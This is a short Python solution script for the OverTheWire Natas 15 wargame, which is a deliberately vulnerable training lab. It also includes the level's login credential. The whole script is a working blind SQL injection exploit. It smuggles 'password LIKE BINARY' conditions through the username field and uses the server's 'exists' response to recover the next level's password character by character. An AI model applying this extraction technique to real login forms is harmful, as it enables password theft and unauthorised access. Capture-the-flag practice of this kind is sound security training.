# Overthewire: Natas 15
# woanmeo11

import requests
from string import digits, ascii_letters


url = 'http://natas15.natas.labs.overthewire.org'
account = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

chars = digits + ascii_letters
filtered = ''
password = ''

for c in chars:
    payload = {'username' : 'natas16" and password LIKE BINARY "%' + c + '%'}
    r = requests.post(url, auth=account, data=payload)
    if 'exists' in r.text:
        filtered += c
        print(filtered)

for i in range(32):
    for c in filtered:
        payload = {'username' : 'natas16" and password LIKE BINARY "' + password + c + '%'}
        r = requests.post(url, auth=account, data=payload)
        if 'exists' in r.text:
            password += c
            print(password)
            break
